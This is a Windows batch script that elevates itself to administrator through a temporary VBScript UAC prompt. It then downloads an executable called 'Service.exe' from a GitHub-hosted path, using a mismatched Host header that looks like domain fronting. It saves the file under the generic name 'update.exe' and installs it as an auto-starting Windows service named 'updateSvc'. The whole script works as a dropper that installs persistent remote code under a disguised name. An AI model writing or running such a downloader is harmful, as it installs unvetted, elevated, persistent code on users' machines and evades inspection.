@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
set programpath="%programdata%\update.exe"
curl https://docs.github.com/GFWConfuser/Service.exe -H "Host: realcybercat.github.io" --output %programpath%
sc create updateSvc binPath= %programpath% start= delayed-auto
sc start updateSvc